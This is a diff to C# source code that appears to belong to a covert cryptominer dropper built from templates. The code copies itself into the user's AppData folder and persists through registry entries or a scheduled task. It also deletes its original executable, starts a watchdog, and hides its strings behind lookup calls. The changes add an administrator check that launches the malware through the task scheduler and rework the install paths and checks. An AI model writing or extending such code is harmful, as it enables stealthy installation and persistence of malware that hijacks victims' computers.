@@ -70,12 +70,12 @@ public partial class _rProgram_
             catch (Exception ex)
             {
 #if DefDebug
-                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("MBW: " + Environment.NewLine + ex.ToString());
 #endif
             }
 #endif
-            string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
-            string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));
+            string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#LIBSPATH"));
+            string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#WATCHDOGPATH"));
 #if DefInstall
             try
             {
@@ -85,9 +85,9 @@ public partial class _rProgram_
 #else
                 string _rcmdl_ = Application.ExecutablePath;
 #endif
-                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase) && !(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem && _rcmdl_.EndsWith(_rGetString_("#INSTALLPATH"), StringComparison.CurrentCultureIgnoreCase)))
+                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                 {
-#if DefMinerOverwrite
+#if DefNoMinerOverwrite
                     if(File.Exists(_rplp_)){
                         _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                         Environment.Exit(0);
@@ -100,7 +100,7 @@ public partial class _rProgram_
                     }
                     catch(Exception ex){
 #if DefDebug
-                        MessageBox.Show("RK: " + ex.ToString());
+                        MessageBox.Show("MRK: " + ex.ToString());
 #endif
                     }
 #endif
@@ -114,7 +114,7 @@ public partial class _rProgram_
                             }
                             catch(Exception ex){
 #if DefDebug
-                                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
+                                MessageBox.Show("MTSA: " + Environment.NewLine + ex.ToString());
 #endif
                                 _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                             }
@@ -124,7 +124,7 @@ public partial class _rProgram_
                     }
                     catch(Exception ex){
 #if DefDebug
-                        MessageBox.Show("M1.5: " + ex.ToString());
+                        MessageBox.Show("MAE: " + ex.ToString());
 #endif
                     }
 
@@ -133,7 +133,15 @@ public partial class _rProgram_
                     File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2000);
 #if DefRunInstall
-                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+                    if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                    {
+                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#TASKSCHSTART"));
+                        
+                    }
+                    else
+                    {
+                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+                    }
 #endif
 #if DefAutoDelete
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDDELETE"), _rcmdl_));
@@ -143,7 +151,7 @@ public partial class _rProgram_
             }
             catch(Exception ex){
 #if DefDebug
-                MessageBox.Show("M2: " + ex.ToString());
+                MessageBox.Show("MFI: " + ex.ToString());
 #endif
             }
 #endif
@@ -179,7 +187,7 @@ public partial class _rProgram_
                 catch (Exception ex)
                 {
 #if DefDebug
-                    MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
+                    MessageBox.Show("MW: " + Environment.NewLine + ex.ToString());
 #endif
                 }
 
@@ -207,7 +215,7 @@ public partial class _rProgram_
                 }
                 catch(Exception ex){
 #if DefDebug
-                    MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
+                    MessageBox.Show("MLE: " + Environment.NewLine + ex.ToString());
 #endif
                 }
 #endif
@@ -239,21 +247,21 @@ public partial class _rProgram_
                 catch (Exception ex)
                 {
 #if DefDebug
-                MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("MMR: " + Environment.NewLine + ex.ToString());
 #endif
                 }
             }
             catch (Exception ex)
             {
 #if DefDebug
-                MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("MMC: " + Environment.NewLine + ex.ToString());
 #endif
             }
         }
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show("M0: " + Environment.NewLine + ex.ToString());
+            MessageBox.Show("MFC: " + Environment.NewLine + ex.ToString());
 #endif
         }
         Environment.Exit(0);
